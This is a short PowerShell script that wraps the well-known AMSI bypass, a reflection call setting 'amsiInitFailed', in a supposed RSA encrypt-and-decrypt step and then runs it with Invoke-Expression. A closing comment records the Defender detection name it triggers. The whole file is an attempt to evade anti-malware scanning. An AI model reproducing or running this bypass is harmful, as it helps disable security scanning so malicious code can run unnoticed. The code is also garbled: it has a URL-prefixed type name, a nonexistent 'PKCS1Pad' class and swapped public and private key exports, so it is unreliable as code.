#Generate RSA key pair
$RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider

# Get the public and private key for encryption and decryption
$PublicKey = $RSA.ExportParameters( $True )
$PrivateKey = $RSA.ExportParameters( $False )

# Encode the script using RSA and PKCS7 padding
$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Text.Encoding]::Unicode.GetBytes($script)

$pkcs7 = New-Object System.Security.Cryptography.PKCS1Pad
$encryptedScript = $pkcs7.Encrypt($encodedScript, $PublicKey)

# Decode the script in memory
$decryptedScript = $pkcs7.Decrypt($encryptedScript, $PrivateKey)
$decodedScript = [System.Text.Encoding]::Unicode.GetString($decryptedScript)

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript


#Detection : Trojan:Win32/AmsiTamper.A!ams
